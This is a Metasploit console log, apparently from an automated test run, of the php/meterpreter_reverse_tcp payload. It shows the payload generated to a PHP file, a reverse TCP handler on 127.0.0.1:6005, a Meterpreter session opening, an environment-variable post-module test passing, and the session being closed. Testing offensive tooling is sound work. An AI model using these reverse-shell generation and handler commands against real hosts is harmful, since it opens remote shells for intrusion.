use php/meterpreter_reverse_tcp
msf6 post(test/meterpreter) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
setg SessionTlvLogging file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20230918-796-71v4futxt
msf6 payload(php/meterpreter_reverse_tcp) > msf6 payload(php/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20230918-796-71v4futxt
msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20230918-796-i9ncfa.php -f raw AutoVerifySessionTimeout=30 lport=6005 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/phpmeterpreter_reverse_tcp_debug_log20230918-796-p15q7ztxt MeterpreterDebugBuild=true
[*] Writing 34913 bytes to D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20230918-796-i9ncfa.php...
msf6 payload(php/meterpreter_reverse_tcp) > to_handler
[*] Payload Handler Started as Job 4
msf6 payload(php/meterpreter_reverse_tcp) > 
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:6005 
[*] Meterpreter session 5 opened (127.0.0.1:6005 -> 127.0.0.1:50024) at 2023-09-18 22:20:11 +0000
use test/get_env
msf6 post(test/get_env) > run session=5 AddEntropy=true Verbose=true
[*] Running against session 5
[*] Session type is meterpreter and platform is windows
[+] should return windows path
[+] should handle % signs
[+] should return multiple envs
[*] Testing complete in 0.04 seconds
[*] Passed: 3; Failed: 0; Skipped: 0
[*] Post module execution completed
msf6 post(test/get_env) > sessions -K
jobs -K
[*] Killing all sessions...
[*] 127.0.0.1 - Meterpreter session 5 closed.
msf6 post(test/get_env) > Stopping all jobs...
msf6 post(test/get_env) > 